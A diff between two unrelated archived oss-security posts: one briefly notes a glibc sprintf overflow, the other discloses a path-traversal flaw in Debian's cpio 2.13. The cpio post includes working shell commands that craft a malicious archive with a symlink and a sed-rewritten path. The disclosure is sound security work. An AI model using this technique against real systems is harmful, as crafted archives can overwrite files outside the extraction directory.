@@ -1,26 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/10/1
-Message-ID: <Y+a7dYG9Qm89wuij@netmeister.org>
-Date: Fri, 10 Feb 2023 16:47:33 -0500
-From: Jan Schaumann <jschauma@...meister.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/21/8
+Message-ID: <65846ba9.7d4fbb18.bm000@oddnet.de>
+Date: Thu, 21 Dec 2023 17:44:50 +0100
+From: Ingo Brückl <ib@...net.de>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2023-25139: glibc-2.37 sprintf buffer overflow
+Subject: Security vulnerability in Debian's cpio 2.13
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Debian has applied patch "revert-CVE-2015-1197-handling" to cpio
+(2.13+dfsg-7.1) to "Fix a regression in handling of CVE-2015-1197 &
+--no-absolute-filenames by reverting part of an upstream commit." and to
+close Debian bugs #946267 ("cpio -i --no-absolute-filenames breaks symlinks
+starting with / or /..") and #946469 ("initramfs-tools-core: unmkinitrams
+creates broken binaries").
 
-I just came across this and don't think I've seen a
-note of it to this list:
+This patch made Debian cpio 2.13 vulnerable to path traversal.
 
-CVE-2023-25139: a buffer overflow in sprintf(3) in
-glibc-2.37:
+The vulnerability has been reported to the Debian bug tracking system:
 
-https://sourceware.org/bugzilla/show_bug.cgi?id=30068
+  https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059163
 
-glibc-2.37 was released on 2023-02-01, so this isn't
-going to be wide spread.
+Instructions to craft a cpio archive to demonstrate the vulnerability:
 
-Fixed in
-https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=c980549cc6a1c03c23cc2fe3e7b0fe626a0364b0
+  mkdir test_cpio
+  ln -sf /tmp/ test_cpio/tmp
+  echo "TEST Traversal" > test_cpio/tmpYtrav.txt
+  cd test_cpio/
+  ls | cpio -ov > ../trav.cpio
+  cd ../
+  sed -i s/"tmpY"/"tmp\/"/g trav.cpio
 
--Jan
+Even
+
+  cpio -id --no-absolute-filenames -I trav.cpio
+
+doesn't prevent path traversal with Debian's cpio, although it does with the
+original cpio.
+
+Ingo
